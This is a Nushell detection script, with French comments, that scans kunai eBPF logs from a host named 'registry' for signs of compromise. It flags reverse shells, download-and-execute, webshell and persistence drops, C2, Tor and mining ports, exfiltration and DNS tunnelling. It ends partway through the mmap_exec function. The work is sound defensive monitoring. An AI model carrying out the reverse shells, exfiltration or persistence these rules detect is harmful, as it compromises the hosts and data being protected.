#!/usr/bin/env nu
# kunai_detect_compromise.nu
#
# Détection de compromission sur les logs kunai de la machine "registry".
# Analyse les fichiers d'événements kunai compressés (.gz), les lignes JSON
# brutes (.jsonl) et le format Parquet (.parquet), en mode lazy polars.
# Le .parquet (issu de kunai_to_parquet.nu) est lu directement sans passer par
# le séparateur ndjson : data/info y sont déjà aplatis.
#
# Usage:
#   nu kunai_detect_compromise.nu                                # les 2 derniers fichiers du registry
#   nu kunai_detect_compromise.nu fichier1.gz fichier2.gz        # fichiers explicites
#   nu kunai_detect_compromise.nu fichier.parquet                # analyse un parquet
#   nu kunai_detect_compromise.nu -n 1                           # n'afficher que 1 ligne par famille
#   nu kunai_detect_compromise.nu -f execve                      # ne lancer qu'une famille
#   nu kunai_detect_compromise.nu --explore                      # affichage dataframe interactif
#
# Familles (--family): all, execve, file_create, connect, send_data,
#                      dns_query, kill, bpf_prog_load, mmap_exec, prctl

# =====================================================================
# ---- Contexte machine "registry" -------------------------------------
# Le contexte LÉGITIME de la machine (agents, services, réseaux, chemins
# bénins, allowlists) a été refactorisé hors du moteur dans le module
# kunai_rules_local.nu (règles LOCALES machine). Le pot commun exécutable
# des règles génériques vit dans kunai_rules.nu. Le moteur consomme ici
# les deux modules et compose générique + local.
# =====================================================================
use /home/pouchou/Nextcloud/dev/dev_nushell/nukunai/kunai_rules_local.nu local_cfg
# pot commun exécutable : règles génériques (sans contexte machine)
use /home/pouchou/Nextcloud/dev/dev_nushell/nukunai/kunai_rules.nu *


# expression polars booléenne : vraie si la tâche (task_name) est dans la liste
# allowlistée passée (liste de noms de process bénins, convertie en df).
export def is_in_df [col, values: list<string>] {
    ((polars col $col) | polars is-in ($values | polars into-df))
}

# not_legit : expression "la ligne N'EST PAS légitime" (à conserver avec filter).
# Une ligne est bénigne si :
#   - la tâche est elle-même un agent légitime (legit_agents), OU
#   - la tâche est un utilitaire bénin (benign_utilities, commande standard) et son
#     PARENT est légitime (agent OU utilitaire, chaîne de parents).
# NB : le PARENT seul ne suffit plus à rendre une ligne bénigne. Sinon un rootkit qui
# daemonise son binaire sous systemd (ex. perfctl → "oom_reaper", parent systemd) serait
# masqué : il n'est ni agent, ni utilitaire, donc il reste DÉTECTÉ quel que soit son parent.
# Un docker/chmod/curl/perl/python3 lancé par un task inconnu reste donc détecté.
# Les listes proviennent du contexte LOCAL machine (kunai_rules_local.nu).
export def not_legit [] {
    let legit = ((local_cfg legit_agents) | polars into-df)
    let utils = ((local_cfg benign_utilities) | polars into-df)
    let task_legit   = ((polars col task_name) | polars is-in $legit)
    let task_utils   = ((polars col task_name) | polars is-in $utils)
    let parent_legit = ((polars col parent_task_name) | polars is-in $legit)
    let parent_utils = ((polars col parent_task_name) | polars is-in $utils)
    # parent "propre" = agent légitime OU utilitaire bénin
    let parent_ok  = ($parent_legit or $parent_utils)
    let benign     = ($task_legit or ($task_utils and $parent_ok))
    $benign | polars expr-not
}

# expression polars booléenne : vraie si la colonne chaîne `col` STARTS-WITH l'un
# des préfixes de `prefixes` (allowlist chemins / réseaux public bénins).
# Le champ dst_ip est une chaîne, on compare donc par début de préfixe ("151.101.",
# "/tmp/cargo-", …) ; équivaut à un match de plage CIDR / chemin en pragmatique.
# On construit une alternance regex ANCREE au début (^) avec chaque préfixe échappé
# comme littéral : polars `contains` attend une regex, la forme ^(p1|p2|…) évite
# tout faux positif (ex. 'ee151.101' ne matche pas '151.101').
export def starts_with_any [col, prefixes: list<string>] {
    # Une allowlist VIDE ne doit jamais tout matcher (sinon `^(...)` -> `^()` matche
    # la chaîne vide et donc chaque ligne, ce qui annulerait le filtre).
    if ($prefixes | is-empty) { return (polars lit false) }
    # échappe chaque préfixe : les métacaractères regex (. * + ? ( ) [ ] { } ^ $ | \) sont
    # précédés d'un backslash pour être traités comme littéraux.
    let escaped = ($prefixes | each {|p| $p | str replace -a -r '([\.\+\*\?\(\)\[\]\{\}\$\^\|\\])' '\$1' })
    let re = ('^(' + ($escaped | str join '|') + ')')
    ((polars col $col) | polars contains $re)
}

# expression polars booléenne : vraie si la colonne chaîne `col` CONTIENT (n'importe
# où) l'un des préfixes de `prefixes`. Variante non-ancrée de starts_with_any, utile
# quand le préfixe n'est pas en tête de la valeur (ex. command_line = "ln -rs
# /var/tmp/mkinitramfs_GHWtJR/..."). Échappe les métacaractères regex comme littéraux.
export def contains_any [col, prefixes: list<string>] {
    # Une allowlist VIDE doit renvoyer false (ne jamais tout matcher via `(?:)` vide).
    if ($prefixes | is-empty) { return (polars lit false) }
    let escaped = ($prefixes | each {|p| $p | str replace -a -r '([\.\+\*\?\(\)\[\]\{\}\$\^\|\\])' '\$1' })
    let re = ('(?:' + ($escaped | str join '|') + ')')
    ((polars col $col) | polars contains $re)
}

# expression polars booléenne : vraie (== le champ dst_ip désigne une adresse
# PRIVÉE / de bouclage / link-local IPv4, en forme brute OU IPv4-mappée `::ffff:`).
# CORRECTIF GÉNÉRIQUE d'un bug kunai : kunai rend `dst_public=true` pour les
# adresses IPv4-mappées `::ffff:` même quand ce sont des RFC1918 (réseau docker
# interne 10./172.16-31./192.168., bouclage 127., link-local 169.254.). Une telle
# destination n'est JAMAIS de l'egress public : c'est du trafic hôte/docker interne.
# On ne peut donc PAS se fier à la colonne source `dst_public` seule pour qualifier
# une exfiltration : un RFC1918 mappé n'est jamais un C2 externe.
export def is_private_dst [] {
    # RFC1918 : 10/8, 172.16/12, 192.168/16 ; bouclage 127/8 ; link-local 169.254/16.
    # Chaque plage figure en forme brute ET en forme IPv4-mappée `::ffff:` (le format
    # exact que kunai rend dans dst_ip pour du trafic docker/hôte).
    let raw = (
        ['127.', '10.', '169.254.', '192.168.']
        | append (16..31 | each {|b| $'172.($b).'})
    )
    let mapped = ($raw | each {|p| $'::ffff:($p)' })
    let priv = ($raw | append $mapped)
    (starts_with_any 'dst_ip' $priv)
}

# =====================================================================
# ---- Base lazy commune (unnests de base) -----------------------------
# =====================================================================
export def build_base [file: string, infer_schema: int] {
    # -- Lecture du fichier source selon son format -----------------------
    # .gz / .jsonl   : lignes JSON compressées ou non, data/info à dérouler.
    # .parquet       : déjà aplati (data/info plat), plus de séparateur ndjson.
    let ext = ($file | path parse | get extension)
    let base = if $ext == 'parquet' {
        polars open $file
    } else {
        polars open $file -t ndjson --infer-schema $infer_schema
        | polars unnest data info
    }
    # -- Structural uns (event/task/host/parent_task) ----------------------
    # rename event -> event_info AVANT l'unnest pour éviter la collision
    # entre data.name/data.id (bpf) et event.name/event.id.
    # Les unnests sont conditionnels : le parquet totalement aplati
    # (kunai_to_flatten_parquet.nu) n'a plus ces colonnes.
    let cols = ($base | polars schema | columns)
    let b = if 'event' in $cols { $base | polars rename event event_info } else { $base }
    let b = ($b
        | unnestif $in 'event_info'
        | unnestif $in 'host'
        | unnestif $in 'task'
        | unnestif $in 'parent_task')
    # path -> main_path (chemin du fichier / cible principale).
    # Ce champ n'existe que si au moins un évènement du lot expose un `path`
    # (ex. file_create) : le rename conditionnel évite un crash quand le
    # fichier n'en contient aucun (ex. un lot 100% connect / execve).
    let cols = ($b | polars schema | columns)
    if "path" in $cols { $b | polars rename [path] [main_path] } else { $b }
}

# =====================================================================
# ---- Conversion automatique gz/jsonl -> parquet (mode par défaut) ----
# =====================================================================
# Un .gz/.jsonl est d'abord converti en .parquet (à côté de la source, ou dans
# --cache-dir), puis analysé sur le parquet : bien plus rapide que de parser
# l'ndjson intact à chaque exécution (benchmark ~14x sur un échantillon typique).
# Comportement par DÉFAUT ; --no-convert (flag global) le désactive pour revenir à
# la lecture directe historique.
# Renvoie { file, converted } : file = chemin à analyser, converted = vrai si une
# conversion a eu lieu (sinon c'était déjà du parquet ou un cache réutilisé).
export def ensure_parquet [
    file: string
    infer_schema: int
    --force
    --cache-dir: string
] {
    # déjà du parquet : rien à convertir.
    if ($file | path parse | get extension) == 'parquet' { return { file: $file, converted: false } }

    # Chemin cible du parquet : à côté de la source, ou dans --cache-dir.
    # Règle convergente (même que default_output de kunai_to_parquet.nu) : on
    # retire seulement un éventuel `.gz`, on conserve le reste du nom puis on
    # ajoute `.parquet`, pour qu'un gz et son jsonl décompressé convergent :
    #   test.jsonl    -> test.jsonl.parquet
    #   test.jsonl.gz -> test.jsonl.parquet
    let ext = ($file | path parse | get extension)
    let target = if $ext == 'gz' {
        let no_gz = ($file | str replace -r '\.gz$' '')
        if ($cache_dir | is-not-empty) { ($cache_dir | path join $"($no_gz | path basename).parquet") } else { $"($no_gz).parquet" }
    } else if ($cache_dir | is-not-empty) {
        ($cache_dir | path join $"($file | path basename).parquet")
    } else {
        $"($file).parquet"
    }

    # Réutilise le cache s'il existe et est à jour (plus récent que la source),
    # sauf si --force impose une reconversion.
    # NB : `metadata` ne renvoie pas les stats de fichier dans ce contexte (juste
    # un span) ; on lit donc la date de modif réelle via `ls`, dont `.modified?`
    # est un datetime fiable. On ne compare la fraîcheur que si les deux dates
    # sont disponibles.
    if (not $force) and ($target | path exists) {
        let src_m = ((ls $file).0.modified?)
        let dst_m = ((ls $target).0.modified?)
        if ($dst_m | is-not-empty) and ($src_m | is-not-empty) and ($dst_m >= $src_m) {
            return { file: $target, converted: false }
        }
    }

    # Convertit via kunai_to_parquet.nu (sous-processus nu), en écrivant vers la
    # cible. lazy est le mode par défaut (passe partout, y compris les gros gz qui
    # saturent la RAM en eager). Pour forcer eager (6x plus rapide mais très
    # gourmand), il faudrait ajouter --eager à l'appel ci-dessous.
    print $"(ansi yellow)⚙ conversion (($file)) → (($target))(ansi reset)"
    let script = ($env.FILE_PWD | path join "kunai_to_parquet.nu")
    let res = (^nu $script $file --output $target --infer-schema $infer_schema | complete)
    if $res.exit_code != 0 {
        error make { msg: $"échec de conversion de ($file) : ($res.stderr)" }
    }
    { file: $target, converted: true }
}

# filtre court sur le nom d'événement kunai
export def ev [name: string] {
    polars filter ((polars col event_info_name) == $name)
}

# unnest conditionnel : ne déroule la colonne que si elle existe. Les formats kunai
# varient (certaines versions n'ont pas socket/src/dns_server/target/prog_type/mapped),
# un polars unnest sur une colonne absente fait échouer la résolution du plan.
export def unnestif [base, col: string] {
    let cols = ($base | polars schema | columns)
    if $col in $cols { $base | polars unnest $col -s "_" } else { $base }
}

# normalise la colonne chemin d'un mmap executé selon le format kunai :
# mapped.path (renommé mapped_path par unnestif), ou mapped_file (ancien format).
# Garantit la présence d'une colonne mapped_path utilisable par la famille mmap_exec.
export def normalize_mapped [base] {
    let cols = ($base | polars schema | columns)
    if "mapped_path" in $cols {
        $base
    } else if "mapped_file" in $cols {
        $base | polars rename [mapped_file] [mapped_path]
    } else {
        $base
    }
}

# select parmi une liste en ne gardant que les colonnes réellement présentes dans le
# lazy frame (les unnest conditionnels exposent des colonnes variables selon le format).
export def cols_keep [cols: list<string>] {
    let df = $in
    let present = ($df | polars schema | columns)
    let keep = ($cols | where {|c| $c in $present })
    if (($keep | length) == 0) {
        # aucune des colonnes de travail n'existe dans ce format : rien à détecter.
        # On renvoie un lazy frame vide (0 ligne, colonne sûre utc_time uniquement)
        # pour ne pas exposer les colonnes Int128 et ne pas crasher le collect.
        $df
            | polars filter (polars lit false)
            | polars select [utc_time]
    } else {
        $df | polars select $keep
    }
}

# vrai si au moins un événement du nom donné est présent dans le fichier.
# Coûte une petite collecte mais évite de référencer des colonnes absentes
# (ex. kill sans target_task_name) quand l'événement n'existe pas du tout.
# NB : on ne sélectionne que utc_time avant collect, car certaines colonnes du
# frame sont typées Int128 par polars et inutilisables en sortie nushell.
export def has_events [base, evname: string] {
    let n = ($base
        | polars filter ((polars col event_info_name) == $evname)
        | polars select [utc_time]
        | polars collect | polars into-nu | length)
    $n > 0
}

# retourne un lazy frame vide (0 ligne) sans référence à une colonne d'événement
# spécifique : utilisé comme sortie "aucune alerte" quand l'événement est absent.
export def empty_like [base] {
    $base
    | polars filter ((polars col event_info_name) == 'kunai__no_such_event')
    | polars select [utc_time]
}

# =====================================================================
# ---- FAMILLE execve : exécution suspecte -----------------------------
# =====================================================================
export def detect_execve [base] {
    # Règles GÉNÉRIQUES importées du pot commun kunai_rules.nu (phénotypes
    # reverse shell / dropper / obfuscation / outil offensif) — voir également
    # les fichiers .yaml kunai homonymes dans kunai_rules/rules_v0.1/.
    let c_shell = (r_execve_shell_tool)
    let c_revsh = (r_execve_reverse_shell)
    let c_dl    = (r_execve_download_exec)
    let c_obf   = (r_execve_obfuscated)
    let c_tool  = (r_execve_offensive_tool)
    let c_tmp   = (r_execve_from_tmp)
    let is_build = (is_in_df 'task_name' (local_cfg allowlist_build_procs))
    # Chaine build INITRAMFS (mkinitramfs/dracut/update-initramfs, provoquée par une
    # mise à jour noyau/module DKMS) : ré-agencement d'utilitaires dans la zone de
    # staging /var/tmp/mkinitramfs_* puis exécution de nombreuses tâches (cp, ln,
    # mkdir, find, depmod, kmod) dont la commande référence ce staging.
    # Signal basé UNIQUEMENT sur le chemin de staging : /var/tmp/mkinitramfs_* est un
    # répertoire réservé créé par mkinitramfs (suffixe aléatoire, n'existe que le
    # temps du build), jamais utilisé par de la persistance malveillante. Même logique
    # que allowlist_build_paths (/tmp/cargo-*). On évite ainsi d'ajouter des utilitaires
    # banals (cp/ln/mkdir/find) aux allowlists de procs, ce qui masquerait un usage
    # offensif depuis /tmp.
    let is_initramfs = (contains_any 'command_line' (local_cfg allowlist_initramfs_paths))
    let c_build_ok = ($is_build or $is_initramfs)
    # Véritable "dropper" : exécution depuis /tmp PAR un process qui n'est PAS la
    # chaîne build (rustup/cargo/cc/rustc…) ni initramfs (dracut/kmod/depmod…)
    # légitime. L'exécution d'un binaire "exec_from_tmp" par un utilitaire type
    # bash/sh/langage reste détectée.
    let c_tmp_real = ($c_tmp and ($c_build_ok | polars expr-not))
    if (not (has_events $base 'execve')) { return (empty_like $base) }

    $base
    | ev 'execve'
    # not_legit couvre désormais aussi les enfants légitimes des agents
    # (ex. python3/perl/grep/sed de check_mk) sans masquer un docker/chmod/curl
    # lancé par un attaquant, ni les mêmes binaires sous un parent non légitime.
    | polars filter (not_legit)
    | polars select [utc_time task_name task_pid command_line]
    | polars with-column (
        (polars when $c_revsh (polars lit "reverse_shell")
         | polars when $c_shell (polars lit "reverse_shell")
         | polars when $c_dl (polars lit "download_and_execute")
         | polars when $c_obf (polars lit "obfuscated_exec")
         | polars when $c_tool (polars lit "offensive_tool")
         | polars when $c_tmp_real (polars lit "exec_from_tmp")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE file_create : persistance / drop -----------------------
# =====================================================================
export def detect_file_create [base] {
    let c_persist = ((polars col main_path) | polars contains "(?:/etc/cron\\.|/var/spool/cron|/etc/systemd/system/|/etc/rc\\.d/|/root/\\.|/home/[^/]+/\\.ssh/|/usr/local/bin/|/usr/bin/[^ ]+\\.old)")
    # Limite de mot (\b) après l'extension : évite de matcher ".sh" au début de
    # "shlex" ou ".so" dans "socks" (artefacts de codegen rustc *.cgu.*.rcgu.o).
    let c_tmpdl   = ((polars col main_path) | polars contains "(?:/tmp/|/dev/shm/)[^ ]*(?:\\.sh|\\.py|\\.pl|\\.elf|\\.so|\\.bin|\\.out|\\.jar|\\.tar|\\.gz|\\.zip)\\b")
    let c_tmpdir  = ((polars col main_path) | polars contains "(?:/tmp/|/var/tmp/|/dev/shm/|/run/shm/|/dev/mqueue/)")
    # Zone scratch build/toolchain LÉGITIME : sous ~/.rustup, ~/.cargo, /tmp/cargo-*,
    # /tmp/cargo-install, /tmp/rustc*, /tmp/cc*, /tmp/tmp.*. Les écritures des threads
    # de codegen rustc ("opt cgu.*", "coordinator") et de l'extraction rustup
    # ("tokio-runtime-w") y tombent, ainsi que les .res/.cdtor.* du linker GCC : ce
    # sont des artefacts de compilation/extraction temporaires, PAS des drops.
    # Threads internes de codegen LLVM de rustc ("opt cgu.*", "lto cgu.*",
    # "coordinator") : écrivent les *.cgu.*.rcgu.o dans la zone scratch build.
    let is_build = ((is_in_df 'task_name' (local_cfg allowlist_build_procs))
        or (starts_with_any 'task_name' ['opt cgu','lto cgu','coordinator','rustc_backtrace']))
    let build_path = (starts_with_any 'main_path' (local_cfg allowlist_build_paths))
    # Par défaut, toute écriture dans une zone scratch build est bénigne (scratch).
    let benign_zone = $build_path
    # tmp_dropper = écriture d'un ARTEFACT EXÉCUTABLE (.sh/.so/.elf/.bin…) dans un
    # répertoire temporaire. On le conserve partout où l'écrivain n'est pas la chaîne
    # build : même en zone scratch, un binaire déposé par un shell/python/curl non-build
    # (script téléchargé) reste détecté. tmp_write = tout autre écriture /tmp.
    let c_tmpdl_real  = ($c_tmpdl and (($benign_zone and $is_build) | polars expr-not))
    let c_tmpdir_real = ($c_tmpdir and ($benign_zone | polars expr-not))
    # Webshell (pot commun r_filecreate_webshell / fs_webshell_drop kunai,
    # T1505.003, sev 9) : script serveur (php/asp/jsp/cgi/py/rb…) créé DANS un
    # document-root web. Un serveur légitime ne crée pas de script exécutable neuf
    # dans son docroot : indicateur fort de compromission web.
    let is_webshell_file = (r_filecreate_webshell)
    # Hidden file temporaire (pot commun r_filecreate_hidden_tmp /
    # fs_hidden_dir_suspicious kunai, T1564.001, sev 7) : fichier caché (préfixe '.')
    # posé dans /tmp|/var/tmp|/dev/shm. N'est signalé que si CE fichier est réellement
    # exécuté (corrélation drop-and-run $c_exec), éliminant les artefacts cachés
    # légitimes jamais exécutés.
    let c_hidden_tmp = (r_filecreate_hidden_tmp)
    if (not (has_events $base 'file_create')) { return (empty_like $base) }

    # ---- Corrélation drop-and-run (remplace le filtrage par volume) -----
    # Un fichier déposé dans une zone temporaire n'est suspect QUE s'il est
    # réellement exécuté : soit mmappé en exécution (mmap_exec.mapped_path),
    # soit lancé comme script/interpréteur (premier mot de command_line sous
    # /tmp|/dev/shm|/var/tmp). Les artefacts temporaires LÉGITIMES (ex. la
    # génération d'initramfs mkinitramfs par dpkg/cp, jamais exécutée) sont
    # ainsi éliminés, tandis que les vrais droppers déposés puis exécutés
    # restent détectés. Ceci est strictement plus restrictif : ne peut créer
    # de nouveaux FP, uniquement un risque de FN si un artefact tmp déposé
    # est exécuté sans caption par mmap_exec ni execve.
    let exec_paths = (do {
        let mmap = ($base
            | polars filter ((polars col event_info_name) == 'mmap_exec')
            | polars unnest mapped -s "_"
            | polars filter ((polars col mapped_path) | polars is-not-null)
            | polars select [(polars col mapped_path)]
            | polars unique | polars collect | polars into-nu | get mapped_path)
        let cfgs = ($base
            | polars filter ((polars col event_info_name) == 'execve')
            | polars unnest exe -s "_"
            | polars filter ((polars col command_line) | polars is-not-null)
            | polars select [(polars col command_line)]
            | polars collect | polars into-nu | get command_line)
        let tmp = ($cfgs
            | each {|x|
                let f = ($x | split row ' ' | first)
                (if (($f | str starts-with '/tmp/') or ($f | str starts-with '/dev/shm/') or ($f | str starts-with '/var/tmp/')) { $f } else { null })
            }
            | where {|x| $x != null})
        ($mmap | append $tmp | uniq)
    })
    let c_exec = (is_in_df 'main_path' $exec_paths)

    $base
    | ev 'file_create'
    | polars filter (not_legit)
    | (unnestif $in exe)
    | polars select [utc_time task_name task_pid main_path]
    | polars with-column (
        (polars when $is_webshell_file (polars lit "webshell_drop")
         | polars when $c_persist (polars lit "persistence_path")
         | polars when ($c_tmpdl_real and $c_exec) (polars lit "tmp_dropper")
         | polars when ($c_tmpdir_real and $c_exec) (polars lit "tmp_write")
         | polars when ($c_hidden_tmp and $c_exec) (polars lit "hidden_tmp")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE connect : réseau sortant suspect ------------------------
# =====================================================================
export def detect_connect [base] {
    # Ports inhabituels/suspects (règles kunai net_c2_port / net_cryptominer_pool, T1095/T1496) :
    # - C2/backdoor : 4444,4445,31337,9001,8888,8443,1337,2222,9999
    # - Tor (exit/OR) : 9050,9051,9150
    # - Pools de minage (xmr/eth) : 5555,7777,14444,14433,45700,3256,20535,3333
    # - divers/protocoles nets : 6667 (IRC/C2), 161,137,445,49152 (ephemeral)
    # Ports C2/backdoor/Tor/mining et protocoles nets inhabituels pour une
    # destination publique — pot commun r_connect_unusual_port (cf. le fichier
    # de règle c2_unusual_port.connect.detection.yaml dans kunai_rules/rules_v0.1/).
    let c_lbl_public = (r_connect_public_egress)
    # CORRECTIF GÉNÉRIQUE du bug kunai : `dst_public` est mal rendu=true pour les
    # RFC1918 IPv4-mappées `::ffff:` (trafic docker/hôte interne). Une destination
    # privée/bouclage n'est jamais de l'egress public -> on la retire de c_public.
    let c_private    = (is_private_dst)
    let c_public     = (($c_lbl_public) and (($c_private) | polars expr-not))
    let c_port   = (r_connect_unusual_port)
    # allowlist réseau EGRESS : destination publique réputée (CDN/miroir/dépôt) ET
    # processus légitime de téléchargement. => bénin, on n'alerte pas.
    let c_allow_net  = (starts_with_any 'dst_ip' (local_cfg allowlist_public_networks))
    let c_allow_proc = (is_in_df 'task_name' (local_cfg allowlist_egress_procs))
    # egress par chemin de la command_line (binaires à task_name instable : threads
    # ELK elasticsearch/logstash/kibana). Corrélation CONTEXTE LOCAL (profil).
    let c_allow_path = (contains_any 'command_line' (local_cfg allowlist_egress_paths))
    let c_allow_port = ((polars col dst_port) | polars is-in (local_cfg allowlist_egress_ports | polars into-df))
    # process légitime = task_name allowlisté OU chemin de command_line allowlisté.
    let c_allow_proc_or_path = (($c_allow_proc) or ($c_allow_path))
    # public_egress SUSPECT = destination publique NON allowlistée, OU destination
    # publique allowlistée mais vers un port inhabituel (ex. C2 sur 31337 d'une IP CDN).
    let c_egress_susp = ($c_public and (($c_allow_net and $c_allow_proc_or_path and $c_allow_port) | polars expr-not))
    if (not (has_events $base 'connect')) { return (empty_like $base) }

    $base
    | ev 'connect'
    | polars filter (not_legit)
    | (unnestif $in exe) | (unnestif $in socket) | (unnestif $in src) | (unnestif $in dst)
    | polars filter ((polars col dst_ip) | polars is-not-null)
    # dst_port 0 = événements de préparation de socket/RAW (résolution, bind via fd)
    # sans vraie connexion sortante : bruit systématique, on ne les signale pas ici.
    | polars filter ((polars col dst_port) != 0)
    # dst_public doit être sélectionné pour être utilisable par with-column
    | (cols_keep [utc_time task_name task_pid command_line src_ip dst_ip dst_port dst_public])
    | polars with-column (
        (polars when $c_egress_susp (polars lit "public_egress")
         | polars when $c_port (polars lit "unusual_port")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE send_data : exfiltration --------------------------------
# =====================================================================
export def detect_send_data [base] {
    let c_lbl_public = (r_connect_public_egress)
    # CORRECTIF GÉNÉRIQUE du bug kunai : `dst_public` est mal rendu=true pour les
    # RFC1918 IPv4-mappées `::ffff:` (trafic docker/hôte interne). Une destination
    # privée/bouclage n'est jamais de l'egress public -> on la retire de c_public.
    let c_private    = (is_private_dst)
    let c_public     = (($c_lbl_public) and (($c_private) | polars expr-not))
    let c_big    = (r_senddata_large)
    let c_hi     = (r_senddata_high_entropy)
    # Exfiltration = envoi de données vers une destination PUBLIQUE (C2/exfil).
    # Le "high_entropy" seul ne suffit PAS : du trafic chiffré interne (agent vers
    # son manager TLS, buildx vers le registry docker local) est normalement à
    # entropie élevée. On ne le signale que si la destination est PUBLIQUE.
    let c_allow_net  = (starts_with_any 'dst_ip' (local_cfg allowlist_public_networks))
    let c_allow_proc = (is_in_df 'task_name' (local_cfg allowlist_egress_procs))
    # egress par chemin de la command_line (binaires à task_name instable : threads
    # ELK elasticsearch/logstash/kibana). Corrélation CONTEXTE LOCAL (profil).
    let c_allow_path = (contains_any 'command_line' (local_cfg allowlist_egress_paths))
    let c_allow_port = ((polars col dst_port) | polars is-in (local_cfg allowlist_egress_ports | polars into-df))
    # egress autorisé = destination publique allowlistée (CDN/dépôt) + process légitime
    # (task_name OU chemin) + port standard. Un tel download vers une cible réputée est
    # bénin, même si le contenu est chiffré (entropie élevée) : TLS vers crates.io/GitHub.
    let c_allow_proc_or_path = (($c_allow_proc) or ($c_allow_path))
    let c_allow_egress = ($c_allow_net and $c_allow_proc_or_path and $c_allow_port)
    let c_egress_susp = ($c_public and ($c_allow_egress | polars expr-not))
    # high_entropy / large_data SUSPECTES = envoi vers l'extérieur NON allowlisté
    # (C2/exfil). Le chiffrement vers une cible réputée (agent->manager TLS interne
    # ou CDN public) n'est PAS exfiltration.
    let c_hi_susp  = ($c_hi  and $c_egress_susp)
    let c_big_susp = ($c_big and $c_egress_susp)
    if (not (has_events $base 'send_data')) { return (empty_like $base) }

    $base
    | ev 'send_data'
    | polars filter (not_legit)
    | (unnestif $in exe) | (unnestif $in src) | (unnestif $in dst)
    | polars filter ((polars col dst_ip) | polars is-not-null)
    # dst_public doit être sélectionné pour être utilisable par with-column
    | (cols_keep [utc_time task_name task_pid command_line src_ip dst_ip dst_port data_size data_entropy dst_public])
    | polars with-column (
        (polars when $c_egress_susp (polars lit "public_egress")
         | polars when $c_big_susp (polars lit "large_data")
         | polars when $c_hi_susp (polars lit "high_entropy")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE dns_query : recon / tunneling ---------------------------
# =====================================================================
export def detect_dns_query [base] {
    # Règles génériques pot commun (cf. dns_suspicious.dns_query.detection.yaml).
    let c_tld    = (r_dns_suspicious_tld)
    let c_long   = (r_dns_long_query)
    let c_nondns = ((((polars col dns_server_ip) | polars is-in (local_cfg dns_ips | polars into-df)) | polars expr-not))
    # Requêtes DNS bénignes (contexte LOCAL, profil) : noms de service internes résolus
    # par Kibana/libuv (elasticsearch, epr.elastic.co…) via le résolveur Docker 127.0.0.11.
    # Une requête bénigne ne doit déclencher AUCUNE évidence dns_query (ni length, ni
    # non_standard_dns_server, ni tld) — on neutralise les 3 signaux quand elle matche.
    let c_benign = (contains_any 'query' (local_cfg allowlist_dns_queries))
    let c_tld_s    = (($c_tld)    and (($c_benign) | polars expr-not))
    let c_long_s   = (($c_long)   and (($c_benign) | polars expr-not))
    let c_nondns_s = (($c_nondns) and (($c_benign) | polars expr-not))
    if (not (has_events $base 'dns_query')) { return (empty_like $base) }

    $base
    | ev 'dns_query'
    | polars filter (not_legit)
    | (unnestif $in exe) | (unnestif $in src) | (unnestif $in dns_server)
    | polars filter ((polars col query) | polars is-not-null)
    | (cols_keep [utc_time task_name task_pid command_line query response dns_server_ip])
    | polars with-column (
        (polars when $c_long_s (polars lit "suspicious_length")
         | polars when $c_nondns_s (polars lit "non_standard_dns_server")
         | polars when $c_tld_s (polars lit "suspicious_tld")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE kill : perturbation / évasion ---------------------------
# =====================================================================
export def detect_kill [base] {
    # Règles génériques pot commun (cf. kill_critical.kill.detection.yaml). La liste
    # de signaux bénins est un contexte LOCAL machine (local_cfg benign_signals).
    let c_target = (r_kill_critical_target)
    let c_hard   = (r_kill_hard_signal)
    let c_benign_sig = ((polars col signal) | polars is-in (local_cfg benign_signals | polars into-df))
    # kill SUSPECT : cible critique (agent/daemon) tuée par un signal de TERMINAISON
    # (pas un signal bénin de runtime) -- le signal reste le vrai signal d'attaque.
    let c_crit_susp = ($c_target and ($c_benign_sig | polars expr-not))
    # kill par un tueur NON légitime (pas not_legit) vers une cible critique même
    # par SIGKILL ; on conserve le cas "SIGKILL hard" hors cycle de vie normal.
    let c_hard_susp = ($c_hard and ($c_benign_sig | polars expr-not))
    if (not (has_events $base 'kill')) { return (empty_like $base) }

    $base
    | ev 'kill'
    | (unnestif $in exe) | (unnestif $in target) | (unnestif $in target_exe) | (unnestif $in target_task)
    | polars filter ((polars col target_task_name) | polars is-not-null)
    # Ne retient que les signaux de terminaison/destruction (pas les signaux bénins
    # de runtime type SIGURG/SIGCHLD) : courte-circuite la majorité du bruit docker.
    | polars filter ($c_benign_sig | polars expr-not)
    # Le processus tueur doit être non légitime (pas un agent ni un utilitaire sous
    # parent légitime) : on n'alerte pas docker qui gère ses propres threads.
    | polars filter (not_legit)
    | (cols_keep [utc_time task_name task_pid command_line target_task_name target_task_pid signal])
    | polars with-column (
        (polars when $c_crit_susp (polars lit "kill_critical")
         | polars when $c_hard_susp (polars lit "SIGKILL_hard")
         | polars otherwise (polars lit "none"))
        | polars as evidence)
    | polars filter ((polars col evidence) != 'none')
}

# =====================================================================
# ---- FAMILLE bpf_prog_load : rootkit / EDR bypass --------------------
# =====================================================================
export def detect_bpf [base] {
    if (not (has_events $base 'bpf_prog_load')) { return (empty_like $base) }
    $base
    | ev 'bpf_prog_load'
    | polars filter (not_legit)
    | (unnestif $in exe) | (unnestif $in prog_type)
    | (cols_keep [utc_time task_name task_pid command_line ksym prog_type_name tag])
    | polars with-column ((polars lit "bpf_by_non_system") | polars as evidence)
}

# =====================================================================
# ---- FAMILLE mmap_exec : injection / drop-and-run --------------------
# =====================================================================
export def detect_mmap_exec [base] {
    # Motif générique pot commun (cf. mmap_exec_tmp.mmap_exec.detection.yaml).
    let c_mapped = (r_mmapexec_from_tmp)
    # rustc/cc… chargent légitimement leurs proc-macro .so depuis /tmp/cargo-* pendant
    # la compilation : ce n'est pas une injection (drop-and-run) mais un artefact de
    # build. On ne signale le mmap depuis /tmp que pour un process non-build.
    let is_build = (is_in_df 'task_name' (local_cfg allowlist_build_procs))
    let build_path = (starts_with_any 'mapped_path' (local_cfg allowlist_build_paths))
    let benign_mmap = ($is_build and $build_path)
    let c_susp = ($c_mapped and ($benign_mmap | polars expr-not))
    if (not (has_events $base 'mmap_exec')) { return (empty_like $base) }

    $base
    | ev 'mmap_exec'
